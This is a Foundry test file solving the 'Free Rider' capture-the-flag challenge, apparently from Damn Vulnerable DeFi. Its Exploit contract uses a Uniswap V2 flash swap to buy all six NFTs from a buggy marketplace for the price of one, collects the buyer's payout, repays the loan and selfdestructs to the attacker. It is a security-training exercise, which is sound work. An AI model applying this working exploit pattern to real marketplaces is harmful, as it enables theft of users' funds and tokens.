// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import { DSTest } from "ds-test/test.sol";
import { console } from "../../utils/Console.sol";
import { Vm } from "forge-std/Vm.sol";
import { stdCheats } from "forge-std/stdlib.sol";

import { ReentrancyGuard } from "openzeppelin-contracts/security/ReentrancyGuard.sol";
import { Address } from "openzeppelin-contracts/utils/Address.sol";
import { IERC20 } from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import { ERC721Holder } from "openzeppelin-contracts/token/ERC721/utils/ERC721Holder.sol";
import { FreeRiderBuyer } from "../../../Contracts/free-rider/FreeRiderBuyer.sol";
import { FreeRiderNFTMarketplace } from "../../../Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import { IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair } from "../../../Contracts/free-rider/Interfaces.sol";
import { DamnValuableNFT } from "../../../Contracts/DamnValuableNFT.sol";
import { DamnValuableToken } from "../../../Contracts/DamnValuableToken.sol";
import { WETH9 } from "../../../Contracts/WETH9.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) external;
}

contract Exploit is IUniswapV2Callee, ERC721Holder {
  FreeRiderBuyer private buyer;
  IUniswapV2Pair private immutable pair;
  FreeRiderNFTMarketplace private immutable market;
  address private immutable owner;
  uint256 private immutable nftPrice;
  uint8 private immutable amountOfNFTs;

  constructor(
    FreeRiderBuyer _buyer,
    IUniswapV2Pair _pair,
    FreeRiderNFTMarketplace _market,
    uint256 _ntfPrice,
    uint8 _amountOfNFTs
  ) {
    buyer = _buyer;
    pair = _pair;
    market = _market;
    nftPrice = _ntfPrice;
    amountOfNFTs = _amountOfNFTs;
    owner = msg.sender;
  }

  function run() external {
    bytes memory data = abi.encode(pair.token1(), nftPrice);
    pair.swap(0, nftPrice, address(this), data);
  }

  function uniswapV2Call(
    address _sender,
    uint256 _amount0,
    uint256 _amount1,
    bytes calldata _data
  ) external {
    require(msg.sender == address(pair), "Invalid pair");
    require(_sender == address(this), "Invalid sender");

    (address token, uint256 amount) = abi.decode(_data, (address, uint256));
    uint256 fee = ((amount * 3) / 997) + 1;
    uint256 amountToRepay = amount + fee;

    WETH9 weth = WETH9(payable(token));
    weth.withdraw(amount);

    uint256[] memory tokenIds = new uint256[](amountOfNFTs);
    for (uint256 tokenId = 0; tokenId < amountOfNFTs; tokenId++) {
      tokenIds[tokenId] = tokenId;
    }

    market.buyMany{ value: nftPrice }(tokenIds);

    DamnValuableNFT nft = DamnValuableNFT(market.token());

    for (uint256 tokenId = 0; tokenId < amountOfNFTs; tokenId++) {
      nft.safeTransferFrom(address(this), address(buyer), tokenId);
    }

    weth.deposit{ value: amountToRepay }();

    IERC20(token).transfer(address(pair), amountToRepay);

    selfdestruct(payable(owner));
  }

  receive() external payable {}
}

contract FreeRider is DSTest, stdCheats {
  Vm internal immutable vm = Vm(HEVM_ADDRESS);

  // The NFT marketplace will have 6 tokens, at 15 ETH each
  uint256 internal constant NFT_PRICE = 15 ether;
  uint8 internal constant AMOUNT_OF_NFTS = 6;
  uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

  // The buyer will offer 45 ETH as payout for the job
  uint256 internal constant BUYER_PAYOUT = 45 ether;

  // Initial reserves for the Uniswap v2 pool
  uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
  uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
  uint256 internal constant DEADLINE = 10_000_000;

  FreeRiderBuyer internal freeRiderBuyer;
  FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
  DamnValuableToken internal dvt;
  DamnValuableNFT internal damnValuableNFT;

  IUniswapV2Pair internal uniswapV2Pair;
  IUniswapV2Factory internal uniswapV2Factory;
  IUniswapV2Router02 internal uniswapV2Router;

  WETH9 internal weth;

  address payable internal buyer;
  address payable internal attacker;
  address payable internal deployer;

  function setUp() public {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    buyer = payable(
      address(uint160(uint256(keccak256(abi.encodePacked("buyer")))))
    );
    vm.label(buyer, "buyer");
    vm.deal(buyer, BUYER_PAYOUT);

    deployer = payable(
      address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
    );
    vm.label(deployer, "deployer");
    vm.deal(
      deployer,
      UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE
    );

    // Attacker starts with little ETH balance
    attacker = payable(
      address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
    );
    vm.label(attacker, "Attacker");
    vm.deal(attacker, 0.5 ether);

    // Deploy WETH contract
    weth = new WETH9();
    vm.label(address(weth), "WETH");

    // Deploy token to be traded against WETH in Uniswap v2
    vm.startPrank(deployer);
    dvt = new DamnValuableToken();
    vm.label(address(dvt), "DVT");

    // Deploy Uniswap Factory and Router
    uniswapV2Factory = IUniswapV2Factory(
      deployCode(
        "./src/build-uniswap/v2/UniswapV2Factory.json",
        abi.encode(address(0))
      )
    );

    uniswapV2Router = IUniswapV2Router02(
      deployCode(
        "./src/build-uniswap/v2/UniswapV2Router02.json",
        abi.encode(address(uniswapV2Factory), address(weth))
      )
    );

    // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
    // Note that the function takes care of deploying the pair automatically
    dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
    uniswapV2Router.addLiquidityETH{ value: UNISWAP_INITIAL_WETH_RESERVE }(
      address(dvt), // token to be traded against WETH
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer, // to
      DEADLINE // deadline
    );

    // Get a reference to the created Uniswap pair
    uniswapV2Pair = IUniswapV2Pair(
      uniswapV2Factory.getPair(address(dvt), address(weth))
    );

    assertEq(uniswapV2Pair.token0(), address(dvt));
    assertEq(uniswapV2Pair.token1(), address(weth));
    assertGt(uniswapV2Pair.balanceOf(deployer), 0);

    freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
      value: MARKETPLACE_INITIAL_ETH_BALANCE
    }(AMOUNT_OF_NFTS);

    damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());

    for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
      assertEq(damnValuableNFT.ownerOf(id), deployer);
    }

    damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);

    uint256[] memory NFTsForSell = new uint256[](6);
    uint256[] memory NFTsPrices = new uint256[](6);
    for (uint8 i = 0; i < AMOUNT_OF_NFTS; ) {
      NFTsForSell[i] = i;
      NFTsPrices[i] = NFT_PRICE;
      unchecked {
        ++i;
      }
    }

    freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);

    assertEq(freeRiderNFTMarketplace.amountOfOffers(), AMOUNT_OF_NFTS);
    vm.stopPrank();

    vm.startPrank(buyer);

    freeRiderBuyer = new FreeRiderBuyer{ value: BUYER_PAYOUT }(
      attacker,
      address(damnValuableNFT)
    );

    vm.stopPrank();

    console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
  }

  function testExploit() public {
    /** EXPLOIT START **/
    vm.startPrank(attacker, attacker);
    Exploit exploit = new Exploit(
      freeRiderBuyer,
      uniswapV2Pair,
      freeRiderNFTMarketplace,
      NFT_PRICE,
      AMOUNT_OF_NFTS
    );
    vm.label(address(exploit), "Exploit");
    exploit.run();
    vm.stopPrank();
    /** EXPLOIT END **/
    validation();
  }

  function validation() internal {
    /** SUCCESS CONDITIONS */

    // Attacker must have earned all ETH from the payout
    assertGt(attacker.balance, BUYER_PAYOUT);
    assertEq(address(freeRiderBuyer).balance, 0);

    // The buyer extracts all NFTs from its associated contract
    vm.startPrank(buyer);
    for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
      damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
      assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
    }
    vm.stopPrank();

    // Exchange must have lost NFTs and ETH
    assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
    assertLt(
      address(freeRiderNFTMarketplace).balance,
      MARKETPLACE_INITIAL_ETH_BALANCE
    );
  }
}
